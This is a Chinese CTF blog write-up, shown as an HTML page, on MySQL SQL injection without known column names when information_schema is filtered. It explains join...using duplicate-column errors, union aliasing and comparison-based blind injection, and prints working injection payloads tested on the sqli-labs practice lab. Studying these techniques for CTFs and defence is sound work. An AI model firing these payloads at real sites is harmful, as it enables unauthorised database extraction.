@@ -1,0 +1,344 @@
+<!doctype html><html lang=en-us>
+<head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。
+无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入
+一、列名重复（join……using） 条件：需要开启报错
+直接拿sqli-labs的email表来做演示（后面也会使用这个表）：
+假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：
+紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：
+一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。
+当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：
+因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：
+或者这样：
+所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。
+join有不同的类型：
+ INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行  其中inner join 和 join是相同的
+security中还有一个users表如下："><title>ctf无列名注入小结</title>
+<link rel=canonical href=https://k1te.cn/2021/05/19/no-column-sql-injection/>
+<link rel=stylesheet href=/scss/style.min.bbcfef3c56489f1f37b552146da519e6b6a74a4c92792bcc512c78e2f55f25e1.css><meta property="og:title" content="ctf无列名注入小结">
+<meta property="og:description" content="ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。
+无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入
+一、列名重复（join……using） 条件：需要开启报错
+直接拿sqli-labs的email表来做演示（后面也会使用这个表）：
+假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：
+紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：
+一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。
+当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：
+因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：
+或者这样：
+所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。
+join有不同的类型：
+ INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行  其中inner join 和 join是相同的
+security中还有一个users表如下：">
+<meta property="og:url" content="https://k1te.cn/2021/05/19/no-column-sql-injection/">
+<meta property="og:site_name" content="k1te's blog">
+<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="web"><meta property="article:tag" content="ctf"><meta property="article:published_time" content="2021-05-19T22:10:17+08:00"><meta property="article:modified_time" content="2021-05-19T22:10:17+08:00">
+<meta name=twitter:title content="ctf无列名注入小结">
+<meta name=twitter:description content="ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。
+无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入
+一、列名重复（join……using） 条件：需要开启报错
+直接拿sqli-labs的email表来做演示（后面也会使用这个表）：
+假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：
+紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：
+一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。
+当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：
+因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：
+或者这样：
+所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。
+join有不同的类型：
+ INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行  其中inner join 和 join是相同的
+security中还有一个users表如下：">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SK3CMJQD3N"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-SK3CMJQD3N')</script>
+</head>
+<body class="article-page has-toc">
+<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
+<div class="container main-container flex
+extended">
+<div id=article-toolbar>
+<a href=/ class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
+<span>Back</span>
+</a>
+</div>
+<main class="main full-width">
+<article class=main-article>
+<header class=article-header>
+<div class=article-details>
+<header class=article-category>
+<a href=/categories/%E7%AC%94%E8%AE%B0/>
+笔记
+</a>
+</header>
+<h2 class=article-title>
+<a href=/2021/05/19/no-column-sql-injection/>ctf无列名注入小结</a>
+</h2>
+<footer class=article-time>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>May 19, 2021</time>
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>
+2 minute read
+</time>
+</div>
+</footer>
+</div>
+</header>
+<section class=article-content>
+<h1 id=ctf无列名注入小结>ctf无列名注入小结</h1>
+<p>其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。</p>
+<p>无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用<code>sys.schema_auto_increment_columns</code>、<code>sys.schema_table_statistics_with_buffer</code>、<code>mysql.innodb_table_stats</code>等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入</p>
+<h2 id=一列名重复joinusing>一、列名重复（join……using）</h2>
+<p>条件：需要开启报错</p>
+<p>直接拿sqli-labs的email表来做演示（后面也会使用这个表）：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518205433174.png loading=lazy></p>
+<p>假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用<code>?id=1' union select * from (select * from emails a join emails b)c--+</code>dump出第一个字段名：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518210803424.png loading=lazy></p>
+<p>紧接着使用<code>?id=1' union select * from (select * from emails a join emails b using(id))c--+</code>dump出第二个字段名：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518210852147.png loading=lazy></p>
+<p>一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。</p>
+<p>当我们继续使用<code>?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+</code>，会报列数不一致的错误：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518211237880.png loading=lazy></p>
+<p>因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518211407558.png loading=lazy></p>
+<p>或者这样：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518211454878.png loading=lazy></p>
+<p>所以join……using到底是啥呢，我又去Google了一下：<code>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</code></p>
+<p>join有不同的类型：</p>
+<ul>
+<li><strong>INNER JOIN</strong>：如果表中有至少一个匹配，则返回行</li>
+<li><strong>LEFT JOIN</strong>：即使右表中没有匹配，也从左表返回所有的行</li>
+<li><strong>RIGHT JOIN</strong>：即使左表中没有匹配，也从右表返回所有的行</li>
+<li><strong>FULL JOIN</strong>：只要其中一个表中存在匹配，则返回行</li>
+</ul>
+<p>其中inner join 和 join是相同的</p>
+<p>security中还有一个users表如下：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518212536488.png loading=lazy></p>
+<p>当我们跨表查询对应用户的email的时候就可以使用join语句，有以下三种写法：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>emails</span><span class=p>.</span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>users</span><span class=p>.</span><span class=n>id</span><span class=p>;</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=k>using</span><span class=p>(</span><span class=n>id</span><span class=p>);</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>,</span><span class=n>emails</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>users</span><span class=p>.</span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>emails</span><span class=p>.</span><span class=n>id</span><span class=p>;</span><span class=w>
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518212937276.png loading=lazy></p>
+<p>我们可以看到当我们使用using的时候id这个字段只出现了一次，但是where和on都出现了两次，并且不会报错。</p>
+<p>但是如果我们在外边套一层select，情况就不一样了</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>select * from (select * from users join emails on emails.id = users.id)a;
+select * from (select * from users join emails using(id))a;
+select * from (select * from users,emails where users.id = emails.id)a;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518213822854.png loading=lazy></p>
+<p>可以看到只有using不会报错，其他两个都报了列名重复的错误，并且指出了具体的列名</p>
+<p>假设我们不知道任何列名，把后面的on、using、where都删掉：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518214037080.png loading=lazy></p>
+<p>都可以爆出第一个字段（虽然说删了之后前面没有区别），但是当我们知道了第一个字段，想要爆出第二个字段的时候，结果就不一样了。（因为email和user只有一个列名重复，所以join两个一样的表（一般都join一样的表），同时还需要给这两个表取两个别名，不然会报表名不唯一的错误:<code>Not unique table/alias: 'emails'</code>）：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>a</span><span class=p>.</span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>id</span><span class=p>)</span><span class=n>a</span><span class=p>;</span><span class=w>
+</span><span class=w></span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>using</span><span class=p>(</span><span class=n>id</span><span class=p>))</span><span class=n>a</span><span class=p>;</span><span class=w>
+</span><span class=w></span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;email_id&#39;</span><span class=w>
+</span><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>emails</span><span class=w> </span><span class=n>a</span><span class=p>,</span><span class=n>emails</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>a</span><span class=p>.</span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>id</span><span class=p>)</span><span class=n>a</span><span class=p>;</span><span class=w>
+</span><span class=w></span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w>
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518215046288.png loading=lazy></p>
+<p>可以看到，只有using可以dump出第二个字段，原因想必大家看到这里都明白了，即便我们指定了where和on，select出来的表依然有重复的字段，但是using不会，所以第一个和第三个指令依然报错id字段重复，而第二条指令则开始报剩下的字段的名字。</p>
+<h2 id=二通过别名引用列名需要使用union>二、通过别名，引用列名（需要使用union）</h2>
+<p>条件：有查询内容回显</p>
+<p>2021国赛初赛的easy_sql之所以不使用这个方法，是因为union被过滤了，所以这也是一个条件吧。</p>
+<p>假设我们不知道emails的字段名，我们可以将他的列名转化为别名：<code>select 1,2 union select * from emails;</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518215915574.png loading=lazy></p>
+<p>然后我们可以引用这个我们已知的别名来获得数据：<code>select 2 from (select 1,2 union select * from emails)x;</code>：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518220235925.png loading=lazy></p>
+<p>当反引号被ban的时候可以使用别名：<code>select a from (select 1,2 a union select * from emails)x;</code>(省略了as)</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518220350816.png loading=lazy></p>
+<p>或者使用双引号：<code>select a from (select 1,"a" union select * from emails)x;</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518220505941.png loading=lazy></p>
+<p>在sqli-lab中的演示：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518220926260.png loading=lazy></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210518220949025.png loading=lazy></p>
+<h2 id=三比较盲注>三、比较盲注</h2>
+<p>条件：盲注的条件</p>
+<p>上面两种方法要么需要报错，要么需要回显，那么盲注的条件下咋办呢，在知道表名的情况下我们可以先select出想要的内容，然后再构造一个内容与其比较，作为盲注时判断的条件。</p>
+<p>例如：<code>select * from users limit 1;</code>得到：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519203436567.png loading=lazy></p>
+<p>我们可以构造<code>select 1,0,0;</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519212238164.png loading=lazy></p>
+<p>然后与其比较：<code>select (select ((select 1,0,0)>(select * from users limit 1)));</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519212330950.png loading=lazy></p>
+<p>结果为false，说明1不大于第一个字段的值</p>
+<p>接着：<code>select (select ((select 2,0,0)>(select * from users limit 1)));</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519212616643.png loading=lazy></p>
+<p>结果为true，说明2大于第一个字段的值，结合上面的可以知道第一个字段的值为1。剩下的以此类推。</p>
+<p>当我准备接着注下去的时候，发现报错了：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519212813564.png loading=lazy></p>
+<p>仔细和网上的文章对照了一下，发现payload没有问题，猜测是数据库版本的问题，现在使用的版本是5.5：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519212933236.png loading=lazy></p>
+<p>抱着怀疑的心态换了个5.7的mysql，然后顺便创建了一个test表：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519213310352.png loading=lazy></p>
+<p>然后继续尝试刚刚的payload：<code>select ((select 1,"f")>(select * from test limit 1));</code></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519213213452.png loading=lazy></p>
+<p>发现可行，应该是某个版本之后这两者可以进行比较，但是具体哪个版本没有进行尝试（又懒又菜），知道的师傅可以和我说一下。</p>
+<p>——————————————————————————</p>
+<p>在数据库中操作完之后开始复盘。</p>
+<p>首先我们得知道表名，这个上边讲过了；其次是得知道这张表中有多少个字段，这个我认为可以通过order by来确定：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519213924873.png loading=lazy></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519214151274.png loading=lazy></p>
+<p>然后得知道有多少行，当大于一行的时候得加上limit不然会报错，永远都返回false，这个只能靠尝试和猜测吧。。。不过flag表一般就一行</p>
+<p>然后就可以进行盲注了：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>?id=1&#39; and ((select &#39;1&#39;,0,0)&gt;(select * from users limit 1))--+
+?id=1&#39; and ((select &#39;2&#39;,0,0)&gt;(select * from users limit 1))--+
+</code></pre></td></tr></table>
+</div>
+</div><p>结果：</p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519215245491.png loading=lazy></p>
+<p><img src=https://cdn.jsdelivr.net/gh/zk1te/img/image-20210519215259111.png loading=lazy></p>
+<h2 id=四order-by盲注>四、order by盲注</h2>
+<p>好像没什么合适的环境，等下回遇到再填坑吧，先贴个链接：<a class=link href=https://www.chabug.org/ctf/852.html target=_blank rel=noopener>一道题引发的无列名注入 | ChaBug安全</a></p>
+<h2 id=最后>最后</h2>
+<p>我的数据库基础不扎实，如果有什么错误的地方还希望师傅们多多包涵，如果能和我交流，指出我的错误就更好啦</p>
+<p>参考：</p>
+<p><a class=link href=https://www.anquanke.com/post/id/193512 target=_blank rel=noopener>聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p><a class=link href=http://www.cl4y.top/information%e8%a2%abban%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e8%bf%9b%e8%a1%8csql%e6%b3%a8%e5%85%a5/ target=_blank rel=noopener>information被ban的情况下进行SQL注入 - Cl4y&rsquo;s SecretCl4y&rsquo;s Secret</a></p>
+<p><a class=link href=https://blog.csdn.net/m0_46230316/article/details/106668182 target=_blank rel=noopener>无列名注入总结_D1stiny的博客-CSDN博客_无列名注入</a></p>
+</section>
+<footer class=article-footer>
+<section class=article-tags>
+<a href=/tags/web/>web</a>
+<a href=/tags/ctf/>ctf</a>
+</section>
+<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+</article>
+<aside class=related-contents--wrapper>
+<h2 class=section-title>Related contents</h2>
+<div class=related-contents>
+<div class="flex article-list--tile">
+<article>
+<a href=/2022/01/10/lfi%E5%AD%A6%E4%B9%A0/>
+<div class=article-details>
+<h2 class=article-title>LFI 新姿势学习</h2>
+</div>
+</a>
+</article>
+<article>
+<a href=/2021/12/12/java%E5%9F%BA%E7%A1%80/>
+<div class=article-details>
+<h2 class=article-title>Java反序列化基础</h2>
+</div>
+</a>
+</article>
+</div>
+</div>
+</aside>
+<div class=disqus-container>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//hugo-theme-stack.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
+<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
+<footer class=site-footer>
+<section class=copyright>
+&copy;
+2020 -
+2022 k1te's blog
+</section>
+<section class=powerby>
+Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
+Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.8.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+</section>
+</footer>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
+</main>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class=widget--toc>
+<nav id=TableOfContents>
+<ol>
+<li><a href=#一列名重复joinusing>一、列名重复（join……using）</a></li>
+<li><a href=#二通过别名引用列名需要使用union>二、通过别名，引用列名（需要使用union）</a></li>
+<li><a href=#三比较盲注>三、比较盲注</a></li>
+<li><a href=#四order-by盲注>四、order by盲注</a></li>
+<li><a href=#最后>最后</a></li>
+</ol>
+</nav>
+</div>
+</section>
+</aside>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+</body>
+</html>
